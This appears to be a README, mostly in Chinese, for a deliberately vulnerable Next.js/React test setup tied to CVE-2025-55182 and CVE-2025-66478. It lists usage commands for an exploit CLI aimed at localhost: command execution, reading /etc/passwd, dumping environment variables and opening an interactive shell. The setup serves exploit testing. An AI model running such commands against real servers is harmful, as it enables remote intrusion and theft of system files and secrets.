# Vulnerable Next.js Test Environment

CVE-2025-55182 / CVE-2025-66478 测试环境

## 版本信息

- Next.js: 15.1.0 (存在漏洞)
- React: 19.0.0 (存在漏洞)

## 搭建步骤

```bash
cd vuln-test
npm install
npm run dev
```

服务器启动在 http://localhost:3000

## 测试 CLI 工具

```bash
# 命令执行
../nextjs-cli exec -t http://localhost:3000 -c "whoami"

# 列目录
../nextjs-cli ls -t http://localhost:3000 -d /etc

# 读取文件
../nextjs-cli read -t http://localhost:3000 -f /etc/passwd

# JS 执行
../nextjs-cli js -t http://localhost:3000 -c "process.env"

# 交互式 Shell
../nextjs-cli shell -t http://localhost:3000
```

## 测试 GUI 工具

```bash
../nextjs-gui
```

在界面中输入 `http://localhost:3000` 即可测试。
